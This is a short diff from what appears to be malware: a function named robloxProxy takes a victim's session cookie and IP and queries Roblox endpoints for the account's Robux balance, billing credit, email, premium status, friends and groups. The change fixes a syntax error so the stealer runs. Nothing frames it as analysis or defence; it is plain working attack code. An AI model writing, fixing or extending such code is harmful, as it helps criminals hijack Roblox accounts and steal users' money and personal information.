@@ -76,7 +76,7 @@ async function robloxProxy(cookie, victimIp, uid) {
     { key: 'auth',     url: 'https://users.roblox.com/v1/users/authenticated' },
     { key: 'robux',    url: 'https://economy.roblox.com/v1/user/currency' },
     { key: 'friends',  url: `https://friends.roblox.com/v1/users/${uid}/friends/count` },
-    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership' },
+    { key: 'premium',  url: `https://premiumfeatures.roblox.com/v1/users/${uid}/validate-membership` },
     { key: 'billing',  url: 'https://billing.roblox.com/v1/credit' },
     { key: 'email',    url: 'https://accountsettings.roblox.com/v1/email' },
     { key: 'groups',   url: `https://groups.roblox.com/v1/users/${uid}/groups/roles` },
